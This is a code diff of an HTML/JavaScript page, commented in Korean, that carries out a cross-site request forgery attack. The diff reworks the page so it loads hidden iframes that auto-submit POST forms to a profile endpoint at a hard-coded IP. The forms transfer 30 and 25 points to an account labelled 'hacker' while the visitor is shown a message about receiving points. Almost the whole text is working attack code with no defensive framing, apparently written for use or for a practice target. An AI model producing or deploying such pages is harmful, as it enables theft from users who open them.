@@ -100,87 +100,67 @@
             statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
-            // Python 스크립트와 동일한 공격 방법들
-            const attacks = [
+            // 첫 번째 공격 - iframe에 직접 HTML 삽입
+            const iframe1 = document.getElementById('attack1');
+            iframe1.onload = () => {
+                console.log('✅ 첫 번째 공격 iframe 로드됨');
+            };
+            
+            iframe1.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+                <html>
+                <body>
+                <form id="hackForm1" method="POST" action="http://3.35.218.180/profile.php">
+                    <input type="hidden" name="receiver_id" value="13">
+                    <input type="hidden" name="points" value="30">
+                    <input type="hidden" name="send_gift" value="1">
+                    <input type="hidden" name="gift_type" value="coffee">
+                    <input type="hidden" name="message" value="어 개털렸죠?">
+                </form>
+                <script>
+                    setTimeout(() => {
+                        document.getElementById('hackForm1').submit();
+                        console.log('🚀 30포인트 공격 전송됨');
+                    }, 500);
+                </script>
+                </body>
+                </html>
+            `);
+            
+            // 2초 후 두 번째 공격
+            setTimeout(() => {
+                const iframe2 = document.getElementById('attack2');
+                iframe2.onload = () => {
+                    console.log('✅ 두 번째 공격 iframe 로드됨');
+                };
                 
-                {
-                    method: 'POST',
-                    url: 'http://3.35.218.180/profile.php',
-                    data: {
-                        receiver_id: '13',
-                        points: '30',
-                        send_gift: '1',
-                        gift_type: 'coffee',
-                        message: '어 개털렸죠?'
-                    },
-                    points: 30
-                },
-                {
-                    method: 'POST',
-                    url: 'http://3.35.218.180/profile.php',
-                    data: {
-                        receiver_id: '13',
-                        points: '25',
-                        gift_type: 'cake',
-                        send_gift: '1',
-                        message: '내가 가져간다 이 대머리야'
-                    },
-                    points: 25
-                },
-               
-            ];
-            
-            let successCount = 0;
-            
-            attacks.forEach((attack, i) => {
-                setTimeout(() => {
-                    try {
-                        if (attack.method === 'GET') {
-                            // GET 방식: img 태그 사용
-                            const img = new Image();
-                            img.onload = () => console.log(`✅ GET 공격 ${i+1} 성공: ${attack.points}P`);
-                            img.onerror = () => console.log(`⚠️ GET 공격 ${i+1} 전송됨: ${attack.points}P`);
-                            img.src = attack.url;
-                            successCount++;
-                            
-                        } else {
-                            // POST 방식: 동적 폼 생성
-                            const form = document.createElement('form');
-                            form.method = 'POST';
-                            form.action = attack.url;
-                            form.style.display = 'none';
-                            form.target = '_blank';
-                            
-                            // 폼 데이터 추가
-                            Object.keys(attack.data).forEach(key => {
-                                const input = document.createElement('input');
-                                input.type = 'hidden';
-                                input.name = key;
-                                input.value = attack.data[key];
-                                form.appendChild(input);
-                            });
-                            
-                            document.body.appendChild(form);
-                            form.submit();
-                            document.body.removeChild(form);
-                            
-                            console.log(`✅ POST 공격 ${i+1} 전송: ${attack.points}P`);
-                            successCount++;
-                        }
-                        
-                    } catch (error) {
-                        console.error(`❌ 공격 ${i+1} 실패:`, error);
-                    }
-                }, i * 2000); // 2초 간격으로 실행
-            });
+                iframe2.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+                    <html>
+                    <body>
+                    <form id="hackForm2" method="POST" action="http://3.35.218.180/profile.php">
+                        <input type="hidden" name="receiver_id" value="13">
+                        <input type="hidden" name="points" value="25">
+                        <input type="hidden" name="send_gift" value="1">
+                        <input type="hidden" name="gift_type" value="cake">
+                        <input type="hidden" name="message" value="내가 가져간다 이 대머리야">
+                    </form>
+                    <script>
+                        setTimeout(() => {
+                            document.getElementById('hackForm2').submit();
+                            console.log('🚀 25포인트 공격 전송됨');
+                        }, 500);
+                    </script>
+                    </body>
+                    </html>
+                `);
+            }, 2000);
             
             // 완료 처리
             setTimeout(() => {
                 showSuccess();
-                console.log(`🎉 총 ${successCount}개 공격 전송 완료!`);
-                console.log(`💰 예상 전송 포인트: 55P`);
-                console.log(`🏴‍☠️ hacker 계정에서 포인트 확인해보세요!`);
-            }, 8000);
+                console.log('🎉 모든 공격 전송 완료!');
+                console.log('💰 예상 전송 포인트: 55P');
+                console.log('🏴‍☠️ hacker 계정에서 포인트 확인해보세요!');
+            }, 6000);
         }
         
         function showSuccess() {
@@ -188,21 +168,6 @@
             successSection.style.display = 'block';
             document.title = '✅ 포인트 지급 완료!';
         }
-        
-        // 페이지 언로드 방지
-        let preventUnload = true;
-        window.addEventListener('beforeunload', function(e) {
-            if (preventUnload) {
-                e.preventDefault();
-                return '포인트 지급이 진행 중입니다.';
-            }
-        });
-        setTimeout(() => { preventUnload = false; }, 10000);
-        
-        console.log('🎯 Python 방식 CSRF 페이지 로드 완료');
-        console.log('📋 타겟: hacker (ID: 13)');
-        console.log('💰 총 포인트: 55P (50+25)');
-        console.log('🚀 파일 열면 자동 실행!');
     </script>
 </body>
 </html>
